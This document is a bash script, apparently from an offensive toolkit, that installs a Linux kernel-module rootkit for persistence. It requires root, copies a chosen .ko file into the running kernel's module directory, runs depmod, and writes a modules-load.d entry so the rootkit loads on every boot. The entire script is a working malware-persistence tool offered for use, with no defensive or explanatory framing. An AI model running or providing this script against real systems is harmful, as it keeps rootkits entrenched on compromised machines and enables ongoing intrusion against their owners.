#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root."
    exit 1
fi

read -p "Enter the full path to the *.ko: " ROOTKIT_PATH

if [ ! -f "$ROOTKIT_PATH" ]; then
    echo "Error: '$ROOTKIT_PATH' was not found."
    exit 1
fi

read -p "Enter the name of the rootkit (without .ko): " ROOTKIT_NAME

CONF_DIR="/etc/modules-load.d"
MODULE_DIR="/usr/lib/modules/$(uname -r)/kernel"

echo "Copying $ROOTKIT_PATH to $MODULE_DIR..."
mkdir -p "$MODULE_DIR"
cp "$ROOTKIT_PATH" "$MODULE_DIR/$ROOTKIT_NAME.ko"

echo "Running depmod..."
depmod

echo "Configuring the module to load on startup..."
echo "$ROOTKIT_NAME" > "$CONF_DIR/$ROOTKIT_NAME.conf"

echo "$ROOTKIT_NAME will be loaded automatically at startup."
